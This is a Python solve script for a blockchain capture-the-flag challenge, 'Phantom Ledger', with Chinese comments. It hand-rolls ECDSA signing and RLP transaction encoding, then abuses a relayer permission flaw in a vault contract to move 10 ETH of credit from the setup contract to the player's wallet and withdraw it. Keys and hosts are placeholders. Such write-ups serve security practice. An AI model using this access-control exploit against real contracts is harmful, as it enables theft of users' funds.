#!/usr/bin/env python3
# Phantom Ledger — 纯标准库手搓 ECDSA + RLP 链上交互 (无 web3.py/ethers)
# 脱敏版: 私钥/实例UUID 已置空, 填入自己的即可跑
# 核心: secp256k1 手写点运算 + keccak256 签名 + EIP-155 RLP 交易
import json, urllib.request
from Crypto.Hash import keccak

RPC = "http://<HOST>:8502/<INSTANCE_UUID>"   # 填入题目实例 RPC
PRIV = int("<FILL_PRIVKEY_HEX>", 16)          # 填入题目给的私钥
SETUP = "0x<SETUP_ADDR>"
WALLET = "0x<WALLET_ADDR>"
CHAIN_ID = 31337

opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
def rpc(method, params):
    req = urllib.request.Request(RPC, json.dumps({"jsonrpc":"2.0","method":method,"params":params,"id":1}).encode(), {"Content-Type":"application/json"})
    r = json.loads(opener.open(req, timeout=20).read())
    if "error" in r: raise Exception(r["error"])
    return r["result"]

def kec(b):
    h = keccak.new(digest_bits=256); h.update(b); return h.digest()

# ---- secp256k1 ----
P = 2**256 - 2**32 - 977
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
def inv(a, m=P): return pow(a, -1, m)
def padd(p, q):
    if p is None: return q
    if q is None: return p
    if p[0] == q[0] and (p[1] + q[1]) % P == 0: return None
    l = (3*p[0]*p[0]) * inv(2*p[1]) % P if p == q else (q[1]-p[1]) * inv((q[0]-p[0]) % P) % P
    x = (l*l - p[0] - q[0]) % P
    return (x, (l*(p[0]-x) - p[1]) % P)
def pmul(k, pt=(Gx, Gy)):
    r = None
    while k:
        if k & 1: r = padd(r, pt)
        pt = padd(pt, pt); k >>= 1
    return r
def pub_addr():
    x, y = pmul(PRIV)
    return kec(x.to_bytes(32,'big') + y.to_bytes(32,'big'))[-20:]
def sign(hash_):
    z = int.from_bytes(hash_, 'big')
    while True:
        k = int.from_bytes(kec(kec(PRIV.to_bytes(32,'big') + hash_)), 'big') % N or 1
        pt = pmul(k); r = pt[0] % N
        if r == 0: continue
        s = inv(k, N) * (z + r*PRIV) % N
        if s == 0: continue
        rec = 0 if pt[1] % 2 == 0 else 1
        if s > N//2: s = N - s; rec ^= 1
        return r, s, rec

# ---- RLP ----
def rlp(x):
    if isinstance(x, int): x = b'' if x == 0 else x.to_bytes((x.bit_length()+7)//8, 'big')
    if isinstance(x, (bytes, bytearray)):
        if len(x) == 1 and x[0] < 0x80: return bytes(x)
        if len(x) <= 55: return bytes([0x80+len(x)]) + bytes(x)
        lb = len(x).to_bytes((len(x).bit_length()+7)//8, 'big')
        return bytes([0xb7+len(lb)]) + lb + bytes(x)
    out = b''.join(rlp(i) for i in x)
    if len(out) <= 55: return bytes([0xc0+len(out)]) + out
    lb = len(out).to_bytes((len(out).bit_length()+7)//8, 'big')
    return bytes([0xf7+len(lb)]) + lb + out

def send(to, data, gas=300000):
    if isinstance(data, str): data = bytes.fromhex(data[2:])
    nonce = int(rpc("eth_getTransactionCount", [WALLET, "pending"]), 16)
    try:
        gas = int(rpc("eth_estimateGas", [{"from": WALLET, "to": to, "data": "0x" + data.hex()}]), 16) + 20000
    except Exception: pass
    gp = max(int(rpc("eth_gasPrice", []), 16), 2_000_000_000)
    unsigned = [nonce, gp, gas, bytes.fromhex(to[2:]), 0, data]
    h = kec(rlp(unsigned + [CHAIN_ID, b'', b'']))
    r, s, rec = sign(h)
    v = CHAIN_ID*2 + 35 + rec
    raw = rlp(unsigned + [v, r, s])
    return rpc("eth_sendRawTransaction", ["0x" + raw.hex()])

def sel(sig): return kec(sig.encode()).hex()[:8]
def addr_pad(a): return a[2:].lower().rjust(64, '0')
def uint_pad(n): return hex(n)[2:].rjust(64, '0')
def call(to, data): return rpc("eth_call", [{"to": to, "data": data}, "latest"])

# ---- 攻击主流程: relayer 权限缺陷 ----
TEN = 10 * 10**18
vault = "0x" + call(SETUP, "0x" + sel("vault()"))[-40:]
print("[1] transferCredit(Setup -> wallet, 10 ETH)  # 玩家是 relayer, 权限通过")
print(send(vault, "0x" + sel("transferCredit(address,address,uint256)") + addr_pad(SETUP) + addr_pad(WALLET) + uint_pad(TEN)))
print("[2] withdraw(10 ETH)")
print(send(vault, "0x" + sel("withdraw(uint256)") + uint_pad(TEN)))
import time; time.sleep(2)
print("isSolved:", call(SETUP, "0x" + sel("isSolved()")))
